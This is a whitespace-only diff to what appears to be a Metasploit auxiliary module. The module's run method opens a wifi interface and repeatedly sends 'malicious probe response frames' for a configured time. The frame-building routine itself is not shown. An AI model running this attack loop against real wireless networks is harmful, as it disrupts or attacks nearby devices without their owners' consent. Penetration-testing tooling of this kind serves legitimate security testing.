@@ -51,25 +51,25 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run
 
-        open_wifi
+		open_wifi
 
-        stime = Time.now.to_i
-        rtime = datastore['RUNTIME'].to_i
-        count = 0
+		stime = Time.now.to_i
+		rtime = datastore['RUNTIME'].to_i
+		count = 0
 
-        print_status("Creating malicious probe response frame...")
+		print_status("Creating malicious probe response frame...")
 
-        frame = create_probe_response()
+		frame = create_probe_response()
 
-        print_status("Sending malicious probe response frames for #{datastore['RUNTIME']} seconds...")
+		print_status("Sending malicious probe response frames for #{datastore['RUNTIME']} seconds...")
 
-        while (stime + rtime > Time.now.to_i)
-            wifi.write(frame)
-            select(nil, nil, nil, 0.10) if (count % 100 == 0)
-            count += 1
-        end
+		while (stime + rtime > Time.now.to_i)
+			wifi.write(frame)
+			select(nil, nil, nil, 0.10) if (count % 100 == 0)
+			count += 1
+		end
 
-        print_status("Completed sending #{count} probe responses.")
+		print_status("Completed sending #{count} probe responses.")
 	end
 
 	def create_probe_response
